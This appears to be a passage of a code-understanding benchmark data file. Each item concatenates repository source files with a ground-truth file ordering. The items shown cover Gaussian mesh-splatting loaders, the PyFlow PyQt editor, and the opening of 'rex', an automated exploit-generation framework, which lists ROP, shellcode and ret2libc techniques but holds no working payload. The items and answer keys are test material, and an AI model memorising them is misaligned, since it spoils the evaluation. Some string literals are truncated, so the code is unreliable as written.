read_extrinsics_binary(cameras_extrinsic_file)\n        cam_intrinsics = read_intrinsics_binary(cameras_intrinsic_file)\n    except:\n        cameras_extrinsic_file = os.path.join(path, \"sparse/0\", \"images.txt\")\n        cameras_intrinsic_file = os.path.join(path, \"sparse/0\", \"cameras.txt\")\n        cam_extrinsics = read_extrinsics_text(cameras_extrinsic_file)\n        cam_intrinsics = read_intrinsics_text(cameras_intrinsic_file)\n\n    reading_dir = \"images\" if images == None else images\n    cam_infos_unsorted = readColmapCameras(cam_extrinsics=cam_extrinsics, cam_intrinsics=cam_intrinsics, images_folder=os.path.join(path, reading_dir))\n    cam_infos = sorted(cam_infos_unsorted.copy(), key = lambda x : x.image_name)\n\n    if eval:\n        train_cam_infos = [c for idx, c in enumerate(cam_infos) if idx % llffhold != 0]\n        test_cam_infos = [c for idx, c in enumerate(cam_infos) if idx % llffhold == 0]\n    else:\n        train_cam_infos = cam_infos\n        test_cam_infos = []\n\n    nerf_normalization = getNerfppNorm(train_cam_infos)\n\n    pcds = []\n    ply_paths = []\n    total_pts = 0\n    for i, (mesh, num) in enumerate(zip(meshes, num_splats)):\n        ply_path = os.path.join(path, f\"points3d_{i}.ply\")\n\n        mesh_scene = trimesh.load(f'{path}/sparse/0/{mesh}.obj', force='mesh')\n        vertices = mesh_scene.vertices\n        faces = mesh_scene.faces\n        triangles = torch.tensor(mesh_scene.triangles).float()\n\n        num_pts_each_triangle = num\n        num_pts = num_pts_each_triangle * triangles.shape[0]\n        total_pts += num_pts\n\n\n        alpha = torch.rand(\n            triangles.shape[0],\n            num_pts_each_triangle,\n            3\n        )\n\n        xyz = torch.matmul(\n            alpha,\n            triangles\n        )\n        xyz = xyz.reshape(num_pts, 3)\n\n        shs = np.random.random((num_pts, 3)) / 255.0\n\n        pcd = MultiMeshPointCloud(\n            alpha=alpha,\n            points=xyz,\n            colors=SH2RGB(shs),\n            normals=np.zeros((num_pts, 3)),\n            vertices=vertices,\n            faces=faces,\n            triangles=triangles.cuda()\n        )\n        pcds.append(pcd)\n        ply_paths.append(ply_path)\n        storePly(ply_path, pcd.points, SH2RGB(shs) * 255)\n\n    print(\n        f\"Generating random point cloud ({total_pts})...\"\n    )\n\n    scene_info = SceneInfo(point_cloud=pcds,\n                           train_cameras=train_cam_infos,\n                           test_cameras=test_cam_infos,\n                           nerf_normalization=nerf_normalization,\n                           ply_path=ply_paths)\n\n    return scene_info\n\nsceneLoadTypeCallbacks = {\n    \"Colmap\": readColmapSceneInfo,\n    \"Blender\": readNerfSyntheticInfo,\n    \"Colmap_Mesh\": readColmapMeshSceneInfo\n}\n\n'gaussian-mesh-splatting/games/scenes/__init__.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\nfrom scene.dataset_readers import (\n    readColmapSceneInfo,\n    readNerfSyntheticInfo,\n)\nfrom games.mesh_splatting.scene.dataset_readers import (\n    readNerfSyntheticMeshInfo\n)\nfrom games.multi_mesh_splatting.scene.dataset_readers import (\n    readColmapMeshSceneInfo\n)\nfrom games.flame_splatting.scene.dataset_readers import (\n    readNerfSyntheticFlameInfo\n)\n\nsceneLoadTypeCallbacks = {\n    \"Colmap\": readColmapSceneInfo,\n    \"Colmap_Mesh\": readColmapMeshSceneInfo,\n    \"Blender\": readNerfSyntheticInfo,\n    \"Blender_Mesh\": readNerfSyntheticMeshInfo,\n    \"Blender_FLAME\": readNerfSyntheticFlameInfo\n}\n\n'gaussian-mesh-splatting/games/flame_splatting/scene/dataset_readers.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\nimport os\nimport numpy as np\nimport torch\n\nfrom games.flame_splatting.utils.graphics_utils import FLAMEPointCloud\nfrom scene.dataset_readers import (\n    readColmapSceneInfo,\n    readNerfSyntheticInfo,\n    readCamerasFromTransforms,\n    getNerfppNorm,\n    SceneInfo,\n    storePly,\n)\nfrom games.mesh_splatting.scene.dataset_readers import (\n    readNerfSyntheticMeshInfo\n)\nfrom games.multi_mesh_splatting.scene.dataset_readers import (\n    readColmapMeshSceneInfo\n)\nfrom utils.sh_utils import SH2RGB\nfrom games.flame_splatting.FLAME import FLAME\nfrom games.flame_splatting.FLAME.config import FlameConfig\n\nsoftmax = torch.nn.Softmax(dim=2)\n\n\ndef transform_vertices_function(vertices, c=8):\n    vertices = torch.squeeze(vertices)\n    vertices = vertices[:, [0, 2, 1]]\n    vertices[:, 1] = -vertices[:, 1]\n    vertices *= c\n    return vertices\n\n\ndef readNerfSyntheticFlameInfo(\n        path, white_background, eval, extension=\".png\"\n):\n    print(\"Reading Training Transforms\")\n    train_cam_infos = readCamerasFromTransforms(path, \"transforms_train.json\", white_background, extension)\n    print(\"Reading Test Transforms\")\n    test_cam_infos = readCamerasFromTransforms(path, \"transforms_test.json\", white_background, extension)\n    print(\"Reading Mesh object\")\n\n    flame_config = FlameConfig()\n    model_flame = FLAME(flame_config).to(flame_config.device)\n\n    vertices, _ = model_flame(\n            flame_config.f_shape, flame_config.f_exp, flame_config.f_pose,\n            neck_pose=flame_config.f_neck_pose, transl=flame_config.f_trans\n    )\n    vertices = transform_vertices_function(\n        vertices,\n        c=flame_config.vertices_enlargement\n    )\n\n    faces = torch.tensor(model_flame.faces.astype(np.int32))\n    faces = torch.squeeze(faces)\n    faces = faces.to(flame_config.device).long()\n\n    triangles = vertices[faces]\n\n    if not eval:\n        train_cam_infos.extend(test_cam_infos)\n        test_cam_infos = []\n\n    nerf_normalization = getNerfppNorm(train_cam_infos)\n\n    ply_path = os.path.join(path, \"points3d.ply\")\n\n    if True:\n\n        num_pts_each_triangle = 100\n        num_pts = num_pts_each_triangle * triangles.shape[0]\n        print(\n            f\"Generating random point cloud ({num_pts})...\"\n        )\n\n\n        alpha = torch.rand(\n            triangles.shape[0],\n            num_pts_each_triangle,\n            3\n        ).to(flame_config.device)\n\n        xyz = torch.matmul(\n            alpha,\n            triangles\n        )\n        xyz = xyz.reshape(num_pts, 3)\n\n        shs = np.random.random((num_pts, 3)) / 255.0\n\n        pcd = FLAMEPointCloud(\n            alpha=alpha,\n            points=xyz.cpu(),\n            colors=SH2RGB(shs),\n            normals=np.zeros((num_pts, 3)),\n            flame_model=model_flame,\n            faces=faces,\n            vertices_init=vertices,\n            transform_vertices_function=transform_vertices_function,\n            flame_model_shape_init=flame_config.f_shape,\n            flame_model_expression_init=flame_config.f_exp,\n            flame_model_pose_init=flame_config.f_pose,\n            flame_model_neck_pose_init=flame_config.f_neck_pose,\n            flame_model_transl_init=flame_config.f_trans,\n            vertices_enlargement_init=flame_config.vertices_enlargement\n        )\n\n        storePly(ply_path, pcd.points, SH2RGB(shs) * 255)\n\n    scene_info = SceneInfo(point_cloud=pcd,\n                           train_cameras=train_cam_infos,\n                           test_cameras=test_cam_infos,\n                           nerf_normalization=nerf_normalization,\n                           ply_path=ply_path)\n    return scene_info\n\n\nsceneLoadTypeCallbacks = {\n    \"Colmap\": readColmapSceneInfo,\n    \"Colmap_Mesh\": readColmapMeshSceneInfo,\n    \"Blender\": readNerfSyntheticInfo,\n    \"Blender_Mesh\": readNerfSyntheticMeshInfo,\n    \"Blender_FLAME\": readNerfSyntheticFlameInfo\n}\n",
        "gt": [
            "'gaussian-mesh-splatting/games/multi_mesh_splatting/utils/graphics_utils.py'",
            "'gaussian-mesh-splatting/games/multi_mesh_splatting/scene/dataset_readers.py'",
            "'gaussian-mesh-splatting/games/flame_splatting/scene/dataset_readers.py'",
            "'gaussian-mesh-splatting/games/scenes/__init__.py'",
            "'gaussian-mesh-splatting/scene/__init__.py'",
            "'gaussian-mesh-splatting/scripts/render_from_mesh_to_mesh.py'"
        ]
    },
    {
        "files": [
            "'PyFlow/pyflow/blocks/containerblock.py'",
            "'PyFlow/pyflow/blocks/__init__.py'",
            "'PyFlow/pyflow/blocks/widgets/__init__.py'",
            "'PyFlow/pyflow/blocks/block.py'",
            "'PyFlow/pyflow/scene/scene.py'"
        ],
        "content": "'PyFlow/pyflow/blocks/containerblock.py'\n:\n\n\n\n\nfrom PyQt5.QtWidgets import QVBoxLayout\nfrom pyflow.blocks.block import Block\n\n\nclass ContainerBlock(Block):\n\n\n    def __init__(self, **kwargs):\n        super().__init__(block_type=\"ContainerBlock\", **kwargs)\n\n\n\n\n\n\n        from pyflow.graphics.view import View\n        from pyflow.scene.scene import Scene\n\n        self.layout = QVBoxLayout(self.root)\n        self.layout.setContentsMargins(\n            int(self.edge_size * 2),\n            int(self.title_widget.height() + self.edge_size * 2),\n            int(self.edge_size * 2),\n            int(self.edge_size * 2),\n        )\n\n        self.child_scene = Scene()\n        self.child_view = View(self.child_scene)\n        self.layout.addWidget(self.child_view)\n\n        self.holder.setWidget(self.root)\n\n'PyFlow/pyflow/blocks/__init__.py'\n:\n\n\n\n\nfrom pyflow.blocks.sliderblock import SliderBlock\nfrom pyflow.blocks.codeblock import CodeBlock\nfrom pyflow.blocks.markdownblock import MarkdownBlock\nfrom pyflow.blocks.drawingblock import DrawingBlock\nfrom pyflow.blocks.containerblock import ContainerBlock\n\n'PyFlow/pyflow/blocks/widgets/__init__.py'\n:\n\n\n\n\nfrom pyflow.blocks.widgets.blocksplitter import Splitter\nfrom pyflow.blocks.widgets.blocktitle import Title\nfrom pyflow.blocks.widgets.blocksizegrip import SizeGrip\n\n'PyFlow/pyflow/blocks/block.py'\n:\n\n\n\n\n\nfrom typing import TYPE_CHECKING, List, Optional, OrderedDict, Tuple, Union\n\nfrom PyQt5.QtCore import QPointF, QRectF, Qt\nfrom PyQt5.QtGui import QBrush, QPen, QColor, QPainter, QPainterPath\nfrom PyQt5.QtWidgets import (\n    QGraphicsItem,\n    QGraphicsProxyWidget,\n    QGraphicsSceneMouseEvent,\n    QStyleOptionGraphicsItem,\n    QWidget,\n)\n\nfrom pyflow.core.serializable import Serializable\nfrom pyflow.core.socket import Socket\nfrom pyflow.blocks.widgets import Splitter, SizeGrip, Title\n\nif TYPE_CHECKING:\n    from pyflow.scene.scene import Scene\n\nBACKGROUND_COLOR = QColor(\"\n\n\nclass Block(QGraphicsItem, Serializable):\n\n\n\n    DEFAULT_DATA = {\n        \"title\": \"New block\",\n        \"splitter_pos\": [0, 0],\n        \"width\": 618,\n        \"height\": 184,\n        \"metadata\": {\n            \"title_metadata\": {\"color\": \"white\", \"font\": \"Ubuntu\", \"size\": 10}\n        },\n        \"sockets\": [],\n    }\n    MANDATORY_FIELDS = {\"block_type\", \"position\"}\n\n    def __init__(\n        self,\n        block_type: str = \"Block\",\n        position: tuple = (0, 0),\n        width: int = DEFAULT_DATA[\"width\"],\n        height: int = DEFAULT_DATA[\"height\"],\n        edge_size: float = 10.0,\n        title: Union[Title, str] = DEFAULT_DATA[\"title\"],\n        parent: Optional[\"QGraphicsItem\"] = None,\n    ):\n\n        QGraphicsItem.__init__(self, parent=parent)\n        Serializable.__init__(self)\n\n        self.block_type = block_type\n        self.setPos(QPointF(*position))\n        self.sockets_in: List[Socket] = []\n        self.sockets_out: List[Socket] = []\n\n        self.pen_width = 3\n        self._pen_outline = QPen(QColor(\"\n        self._pen_outline.setWidth(self.pen_width)\n        self._pen_outline_selected = QPen(QColor(\"\n        self._pen_outline_selected.setWidth(self.pen_width)\n        self._brush_background = QBrush(BACKGROUND_COLOR)\n\n        self.setFlag(QGraphicsItem.GraphicsItemFlag.ItemIsSelectable)\n        self.setFlag(QGraphicsItem.GraphicsItemFlag.ItemIsMovable)\n\n        self.setAcceptHoverEvents(True)\n\n        self.holder = QGraphicsProxyWidget(self)\n        self.root = QWidget()\n        self.root.setAttribute(Qt.WA_TranslucentBackground)\n        self.root.setGeometry(0, 0, int(width), int(height))\n\n        self.title_widget = Title(title, parent_widget=self.root, parent_block=super())\n        self.title_widget.setAttribute(Qt.WA_TranslucentBackground)\n\n        self.splitter = Splitter(self, Qt.Vertical, self.root)\n\n        self.size_grip = SizeGrip(self, self.root)\n\n        if type(self) == Block:\n\n\n            self.holder.setWidget(self.root)\n\n        self.edge_size = edge_size\n        self.min_width = 300\n        self.min_height = 100\n        self.width = width\n        self.height = height\n\n        self.moved = False\n        self.metadata = {}\n\n    def scene(self) -> \"Scene\":\n\n        return super().scene()\n\n    def boundingRect(self) -> QRectF:\n\n        return QRectF(0, 0, self.width, self.height).normalized()\n\n    def paint(\n        self,\n        painter: QPainter,\n        option: QStyleOptionGraphicsItem,\n        widget: Optional[QWidget] = None,\n    ):\n\n\n\n        path_content = QPainterPath()\n        path_content.setFillRule(Qt.FillRule.WindingFill)\n        path_content.addRoundedRect(\n            0, 0, self.width, self.height, self.edge_size, self.edge_size\n        )\n        painter.setPen(Qt.PenStyle.NoPen)\n        painter.setBrush(self._brush_background)\n        painter.drawPath(path_content.simplified())\n\n\n        path_outline = QPainterPath()\n        path_outline.addRoundedRect(\n            0, 0, self.width, self.height, self.edge_size, self.edge_size\n        )\n        painter.setPen(self.pen_outline)\n        painter.setBrush(Qt.BrushStyle.NoBrush)\n        painter.drawPath(path_outline.simplified())\n\n\n        if self.isSelected():\n            path_in_outline = QPainterPath()\n            outline_width = self.pen_outline.widthF()\n            path_in_outline.addRoundedRect(\n                -2 * outline_width,\n                -2 * outline_width,\n                self.width + 4 * outline_width,\n                self.height + 4 * outline_width,\n                self.edge_size + 2 * outline_width,\n                self.edge_size + 2 * outline_width,\n            )\n            painter.setPen(self._pen_outline_selected)\n            painter.setBrush(Qt.BrushStyle.NoBrush)\n            painter.drawPath(path_in_outline.simplified())\n\n    def add_socket(self, socket: Socket):\n\n        if socket.socket_type == \"input\":\n            self.sockets_in.append(socket)\n        else:\n            self.sockets_out.append(socket)\n        self.update_sockets()\n\n    def mouseReleaseEvent(self, event: QGraphicsSceneMouseEvent):\n\n        if self.moved:\n            self.moved = False\n            self.scene().history.checkpoint(\"Moved block\", set_modified=True)\n        super().mouseReleaseEvent(event)\n\n    def mouseMoveEvent(self, event: QGraphicsSceneMouseEvent):\n\n        super().mouseMoveEvent(event)\n        self.moved = True\n\n\n\n        self.update_sockets()\n        self.update_neighbors_sockets()\n\n    def remove(self):\n\n        scene = self.scene()\n        for socket in self.sockets_in + self.sockets_out:\n            socket.remove()\n        if scene is not None:\n            scene.removeItem(self)\n\n    def update_splitter(self):\n\n\n\n        self.splitter.setGeometry(\n            int(self.edge_size),\n            int(self.edge_size + self.title_widget.height()),\n            int(self.width - self.edge_size * 2),\n            int(self.height - self.edge_size * 2 - self.title_widget.height()),\n        )\n\n    def update_title(self):\n\n        self.title_widget.setGeometry(\n            int(self.edge_size),\n            int(self.edge_size / 2),\n            int(self.width - self.edge_size * 3),\n            int(self.title_widget.height()),\n        )\n\n    def update_size_grip(self):\n\n        self.size_grip.setGeometry(\n            int(self.width - self.edge_size * 2),\n            int(self.height - self.edge_size * 2),\n            int(self.edge_size * 1.7),\n            int(self.edge_size * 1.7),\n        )\n\n    def get_socket_pos(self, socket: Socket) -> Tuple[float]:\n\n        if socket.socket_type == \"input\":\n            y = 0\n            sockets = self.sockets_in\n        else:\n            y = self.height\n            sockets = self.sockets_out\n\n\n        space_between_sockets = self.width / (len(sockets) + 1)\n        x = space_between_sockets * (sockets.index(socket) + 1)\n\n        return x, y\n\n    def update_sockets(self):\n\n\n        def x_end_position(socket: Socket) -> float:\n\n            if not socket.edges:\n                return 0\n            return socket.edges[0].destination.x()\n\n        def x_start_position(socket: Socket) -> float:\n\n            if not socket.edges:\n                return 0\n            return socket.edges[0].source.x()\n\n        self.sockets_in.sort(key=x_start_position)\n        self.sockets_out.sort(key=x_end_position)\n\n        for socket in self.sockets_in + self.sockets_out:\n            socket.setPos(*self.get_socket_pos(socket))\n\n    def update_neighbors_sockets(self):\n\n        for socket in self.sockets_in:\n            for edge in socket.edges:\n                if edge.source_socket is not None:\n                    edge.source_socket.block.update_sockets()\n        for socket in self.sockets_out:\n            for edge in socket.edges:\n                if edge.destination_socket is not None:\n                    edge.destination_socket.block.update_sockets()\n\n    def update_all(self):\n\n        self.update_sockets()\n        self.update_splitter()\n        self.update_title()\n        self.update_size_grip()\n\n    @property\n    def title(self):\n\n        return self.title_widget.text()\n\n    @title.setter\n    def title(self, value: str):\n        if hasattr(self, \"title_widget\"):\n            self.title_widget.setText(value)\n\n    @property\n    def width(self):\n\n        return self.root.width()\n\n    @width.setter\n    def width(self, value: float):\n        self.root.setGeometry(0, 0, int(value), self.root.height())\n\n    @property\n    def height(self):\n\n        return self.root.height()\n\n    @height.setter\n    def height(self, value: float):\n        self.root.setGeometry(0, 0, self.root.width(), int(value))\n\n    @property\n    def pen_outline(self) -> QPen:\n\n        return self._pen_outline\n\n    def serialize(self) -> OrderedDict:\n\n        self.metadata.update({\"title_metadata\": self.title_widget.serialize()})\n        metadata = OrderedDict(sorted(self.metadata.items()))\n        return OrderedDict(\n            [\n                (\"id\", self.id),\n                (\"title\", self.title),\n                (\"block_type\", self.block_type),\n                (\"splitter_pos\", self.splitter.sizes()),\n                (\"position\", [self.pos().x(), self.pos().y()]),\n                (\"width\", self.width),\n                (\"height\", self.height),\n                (\"metadata\", metadata),\n                (\n                    \"sockets\",\n                    [\n                        socket.serialize()\n                        for socket in self.sockets_in + self.sockets_out\n                    ],\n                ),\n            ]\n        )\n\n    def deserialize(self, data: dict, hashmap: dict = None, restore_id=True) -> None:\n\n        if restore_id and \"id\" in data:\n            self.id = data[\"id\"]\n\n        self.complete_with_default(data)\n\n        for dataname in (\"title\", \"block_type\", \"width\", \"height\"):\n            setattr(self, dataname, data[dataname])\n\n        self.setPos(QPointF(*data[\"position\"]))\n        self.metadata = dict(data[\"metadata\"])\n        self.title_widget.deserialize(\n            self.metadata[\"title_metadata\"], hashmap, restore_id\n        )\n\n        if \"splitter_pos\" in data:\n            self.splitter.setSizes(data[\"splitter_pos\"])\n\n        if len(data[\"sockets\"]) > 0:\n\n            for socket in self.sockets_in + self.sockets_out:\n                socket.remove()\n\n\n            for socket_data in data[\"sockets\"]:\n                socket = Socket(block=self)\n                socket.deserialize(socket_data, hashmap, restore_id)\n\n                self.add_socket(socket)\n\n                if hashmap is not None:\n                    hashmap.update({socket_data[\"id\"]: socket})\n\n        self.update_all()\n\n'PyFlow/pyflow/scene/scene.py'\n:\n\n\n\n\nimport math\nimport json\nfrom os import path\nfrom types import FunctionType, ModuleType\nfrom typing import TYPE_CHECKING, Any, List, OrderedDict, Union\n\nfrom PyQt5.QtCore import QLine, QRectF, QThreadPool\nfrom PyQt5.QtGui import QColor, QPainter, QPen\nfrom PyQt5.QtWidgets import QGraphicsScene\n\nfrom pyflow.core.serializable import Serializable\nfrom pyflow.blocks.block import Block\nfrom pyflow.core.edge import Edge\nfrom pyflow.scene.history import SceneHistory\nfrom pyflow.core.kernel import Kernel\nfrom pyflow.scene.from_ipynb_conversion import ipynb_to_ipyg\nfrom pyflow.scene.to_ipynb_conversion import ipyg_to_ipynb\nfrom pyflow import blocks\nfrom pyflow.logging import log_init_time, get_logger\n\nLOGGER = get_logger(__name__)\n\nif TYPE_CHECKING:\n    from pyflow.graphics.view import View\n\n\nclass Scene(QGraphicsScene, Serializable):\n\n\n\n    @log_init_time(LOGGER)\n    def __init__(\n        self,\n        parent=None,\n        background_color: str = \"\n        grid_color: str = \"\n        grid_light_color: str = \"\n        width: int = 64000,\n        height: int = 64000,\n        grid_size: int = 20,\n        grid_squares: int = 5,\n    ):\n        Serializable.__init__(self)\n        QGraphicsScene.__init__(self, parent=parent)\n\n        self._background_color = QColor(background_color)\n        self._grid_color = QColor(grid_color)\n        self._grid_light_color = QColor(grid_light_color)\n        self.grid_size = grid_size\n        self.grid_squares = grid_squares\n\n        self.width, self.height = width, height\n        self.setSceneRect(-self.width // 2, -self.height // 2, self.width, self.height)\n        self.setBackgroundBrush(self._background_color)\n\n        self._has_been_modified = False\n        self._has_been_modified_listeners = []\n\n        self.history = SceneHistory(self)\n        self.history.checkpoint(\"Initialized scene\", set_modified=False)\n\n        self.kernel = Kernel()\n        self.threadpool = QThreadPool()\n\n    @property\n    def has_been_modified(self):\n\n        return self._has_been_modified\n\n    @has_been_modified.setter\n    def has_been_modified(self, value: bool):\n        self._has_been_modified = value\n        for callback in self._has_been_modified_listeners:\n            callback()\n\n    def getItemById(self, item_id: int) -> Any:\n\n        for item in self.items():\n            if hasattr(item, \"id\") and item.id == item_id:\n                return item\n\n    def addHasBeenModifiedListener(self, callback: FunctionType):\n\n        self._has_been_modified_listeners.append(callback)\n\n    def sortedSelectedItems(self) -> List[Union[Block, Edge]]:\n\n        selected_blocks, selected_edges = [], []\n        for item in self.selectedItems():\n            if isinstance(item, Block):\n                selected_blocks.append(item)\n            if isinstance(item, Edge):\n                selected_edges.append(item)\n        return selected_blocks, selected_edges\n\n    def drawBackground(self, painter: QPainter, rect: QRectF):\n\n        super().drawBackground(painter, rect)\n        self.drawGrid(painter, rect)\n\n    def drawGrid(self, painter: QPainter, rect: QRectF):\n\n        left = int(math.floor(rect.left()))\n        top = int(math.floor(rect.top()))\n        right = int(math.ceil(rect.right()))\n        bottom = int(math.ceil(rect.bottom()))\n\n        first_left = left - (left % self.grid_size)\n        first_top = top - (top % self.grid_size)\n\n\n        lines_light, lines_dark = [], []\n        for x in range(first_left, right, self.grid_size):\n            if x % (self.grid_size * self.grid_squares) != 0:\n                lines_light.append(QLine(x, top, x, bottom))\n            else:\n                lines_dark.append(QLine(x, top, x, bottom))\n\n        for y in range(first_top, bottom, self.grid_size):\n            if y % (self.grid_size * self.grid_squares) != 0:\n                lines_light.append(QLine(left, y, right, y))\n            else:\n                lines_dark.append(QLine(left, y, right, y))\n\n\n        pen = QPen(self._grid_color)\n        pen.setWidth(2)\n        painter.setPen(pen)\n        painter.drawLines(*lines_dark)\n\n        pen = QPen(self._grid_light_color)\n        pen.setWidth(1)\n        painter.setPen(pen)\n        painter.drawLines(*lines_light)\n\n    def save(self, filepath: str):\n\n        self.save_to_ipyg(filepath)\n        self.has_been_modified = False\n\n    def save_to_ipyg(self, filepath: str):\n\n        if \".\" not in filepath:\n            filepath += \".ipyg\"\n\n        extention_format = filepath.split(\".\")[-1]\n        if extention_format != \"ipyg\":\n            raise NotImplementedError(f\"Unsupported format {extention_format}\")\n\n        with open(filepath, \"w\", encoding=\"utf-8\") as file:\n            file.write(json.dumps(self.serialize(), indent=4))\n\n    def save_to_ipynb(self, filepath: str):\n\n        if \".\" not in filepath:\n            filepath += \".ipynb\"\n\n        extention_format: str = filepath.split(\".\")[-1]\n        if extention_format != \"ipynb\":\n            raise NotImplementedError(\n                f\"The file should be a *.ipynb (not a .{extention_format})\"\n            )\n\n        with open(filepath, \"w\", encoding=\"utf-8\") as file:\n            json_ipyg_data: OrderedDict = self.serialize()\n            json_ipynb_data: OrderedDict = ipyg_to_ipynb(json_ipyg_data)\n            file.write(json.dumps(json_ipynb_data, indent=4))\n\n    def load(self, filepath: str):\n\n        if filepath.endswith(\".ipyg\"):\n            data = self.load_from_json(filepath)\n        elif filepath.endswith(\".ipynb\"):\n            ipynb_data = self.load_from_json(filepath)\n            data = ipynb_to_ipyg(ipynb_data)\n        else:\n            extention_format = filepath.split(\".\")[-1]\n            raise NotImplementedError(f\"Unsupported format {extention_format}\")\n        self.deserialize(data)\n        self.history.checkpoint(\"Loaded scene\", erase_previous_checkpoints=True)\n        self.has_been_modified = False\n\n\n        dir_path = repr(path.abspath(path.dirname(filepath)))\n        setup_path_code = f'__import__(\"os\").chdir({dir_path})'\n        self.kernel.execute(setup_path_code)\n\n    def load_from_json(self, filepath: str) -> OrderedDict:\n\n        with open(filepath, \"r\", encoding=\"utf-8\") as file:\n            data = json.loads(file.read())\n        return data\n\n    def clear(self):\n\n        self.has_been_modified = False\n        return super().clear()\n\n    def create_block_from_file(self, filepath: str, x: float = 0, y: float = 0):\n\n        with open(filepath, \"r\", encoding=\"utf-8\") as file:\n            data = json.loads(file.read())\n        data[\"position\"] = [x, y]\n        data[\"sockets\"] = {}\n        block = self.create_block(data, None, False)\n        self.history.checkpoint(\"Created block from file\", set_modified=True)\n        return block\n\n    def create_block(\n        self, data: OrderedDict, hashmap: dict = None, restore_id: bool = True\n    ) -> Block:\n\n\n        block = None\n\n        block_constructor = None\n        block_files = blocks.__dict__\n\n        for block_name in block_files:\n            block_module = getattr(blocks, block_name)\n            if isinstance(block_module, ModuleType):\n                if hasattr(block_module, data[\"block_type\"]):\n                    block_constructor = getattr(block_module, data[\"block_type\"])\n\n        if block_constructor is None:\n            raise NotImplementedError(f\"{data['block_type']} is not a known block type\")\n\n        block: Block = block_constructor()\n        block.deserialize(data, hashmap, restore_id)\n        self.addItem(block)\n        if hashmap is not None:\n            hashmap.update({data[\"id\"]: block})\n        return block\n\n    def update_all_blocks_sockets(self):\n\n        for item in self.items():\n            if isinstance(item, Block):\n                item.update_sockets()\n\n    def views(self) -> List[\"View\"]:\n        return super().views()\n\n    def serialize(self) -> OrderedDict:\n\n        blocks: List[Block] = []\n        edges: List[Edge] = []\n        for item in self.items():\n            if isinstance(item, Block):\n                blocks.append(item)\n            elif isinstance(item, Edge):\n                edges.append(item)\n        blocks.sort(key=lambda x: x.id)\n        edges.sort(key=lambda x: x.id)\n        return OrderedDict(\n            [\n                (\"id\", self.id),\n                (\"blocks\", [block.serialize() for block in blocks]),\n                (\"edges\", [edge.serialize() for edge in edges]),\n            ]\n        )\n\n    def deserialize(\n        self, data: OrderedDict, hashmap: dict = None, restore_id: bool = True\n    ):\n        self.clear()\n        hashmap = hashmap if hashmap is not None else {}\n        if restore_id and \"id\" in data:\n            self.id = data[\"id\"]\n\n\n        for block_data in data[\"blocks\"]:\n            self.create_block(block_data, hashmap, restore_id)\n\n\n        for edge_data in data[\"edges\"]:\n            edge = Edge()\n            edge.deserialize(edge_data, hashmap, restore_id)\n            self.addItem(edge)\n            hashmap.update({edge_data[\"id\"]: edge})\n\n\n        for item in self.items():\n            if isinstance(item, Block):\n                for socket in item.sockets_in + item.sockets_out:\n                    if not socket.edges:\n                        socket.remove()\n",
        "gt": [
            "'PyFlow/pyflow/blocks/widgets/__init__.py'",
            "'PyFlow/pyflow/blocks/block.py'",
            "'PyFlow/pyflow/blocks/containerblock.py'",
            "'PyFlow/pyflow/blocks/__init__.py'",
            "'PyFlow/pyflow/scene/scene.py'"
        ]
    },
    {
        "files": [
            "'rex/rex/exploit/techniques/__init__.py'",
            "'rex/rex/vulnerability.py'",
            "'rex/rex/exploit/techniques/explore_for_exploit.py'",
            "'rex/rex/__init__.py'"
        ],
        "content": "'rex/rex/exploit/techniques/__init__.py'\n:import os\nfrom collections import defaultdict\nimport importlib\n\nimport logging\nl = logging.getLogger(\"rex.exploit.techniques\")\n\nfrom ..technique import Technique\n\nfrom .rop_set_register import RopSetRegister\nfrom .shellcode_set_register import ShellcodeSetRegister\nfrom .circumstantial_set_register import CircumstantialSetRegister\nfrom .rop_leak_memory import RopLeakMemory\nfrom .shellcode_leak_address import ShellcodeLeakAddress\nfrom .rop_to_system import RopToSystem\nfrom .rop_to_execl import RopToExecl\nfrom .call_shellcode import CallShellcode\nfrom .call_jmp_sp_shellcode import CallJmpSPShellcode\nfrom .explore_for_exploit import ExploreForExploit\nfrom .rop_register_control import RopRegisterControl\nfrom .rop_to_execl import RopToExecl\nfrom .rop_to_accept_system import RopToAcceptSystem\nfrom .rop_to_system_complicated import RopToSystemComplicated\nfrom .ret2libc import Ret2Libc\n\n\nTechniques = defaultdict(list)\nfor t in Technique.__subclasses__():\n    for o in t.applicable_to:\n        Techniques[o].append(t)\n\nTechniques = dict(Techniques)\n\n'rex/rex/vulnerability.py'\n:import logging\n\nl = logging.getLogger(\"rex.Vulnerability\")\n\nclass Vulnerability:\n\n    IP_OVERWRITE              = \"ip_overwrite\"\n    PARTIAL_IP_OVERWRITE      = \"partial_ip_overwrite\"\n    UNCONTROLLED_IP_OVERWRITE = \"uncontrolled_ip_overwrite\"\n    BP_OVERWRITE              = \"bp_overwrite\"\n    PARTIAL_BP_OVERWRITE      = \"partial_bp_overwrite\"\n    WRITE_WHAT_WHERE          = \"write_what_where\"\n    WRITE_X_WHERE             = \"write_x_where\"\n    UNCONTROLLED_WRITE        = \"uncontrolled_write\"\n    ARBITRARY_READ            = \"arbitrary_read\"\n    NULL_DEREFERENCE          = \"null_dereference\"\n    ARBITRARY_TRANSMIT        = \"arbitrary_transmit\"\n    ARBITRARY_RECEIVE         = \"arbitrary_receive\"\n\n'rex/rex/exploit/techniques/explore_for_exploit.py'\n:import logging\nimport rex.crash\nimport rex.exploit.cgc.type2.cgc_type2_general\nfrom rex import Vulnerability\nfrom rex.exploit import CannotExploit\nfrom ..technique import Technique\n\nimport claripy\nimport angr\n\n\nl = logging.getLogger(\"rex.exploit.techniques.explore_for_exploit\")\n\n\nclass WriteInfo(object):\n    def __init__(self, addr, data, min_addr, max_addr, assigned_loc, mem_range):\n        self.addr = addr\n        self.data = data\n        self.min_addr = min_addr\n        self.max_addr = max_addr\n        self.assigned_loc = assigned_loc\n        self.mem_range = mem_range\n\n\nclass ReadInfo(object):\n    def __init__(self, addr, data, min_addr, max_addr, assigned_loc, mem_range):\n        self.addr = addr\n        self.data_expr = data\n        self.min_addr = min_addr\n        self.max_addr = max_addr\n        self.assigned_loc = assigned_loc\n        self.mem_range = mem_range\n\n\nclass MemRange(object):\n    def __init__(self, start_addr, assigned_start):\n        self.start_addr = start_addr\n        self.min_start = 0\n        self.max_start = 0\n        self.assigned_start = assigned_start\n        self.offset_to_data = dict()\n        self.all_addr_keys = {start_addr.cache_key}\n\n\nclass AttackAddr(object):\n    def __init__(self, addr, goal_start=None, goal_end=None):\n        self.addr = addr\n        self.goal_start = goal_start\n        self.goal_end = goal_end\n\n\n\n\n\n\n\n\n\nclass SimAddressTracker(angr.state_plugins.SimStatePlugin):\n\n    def __init__(self):\n        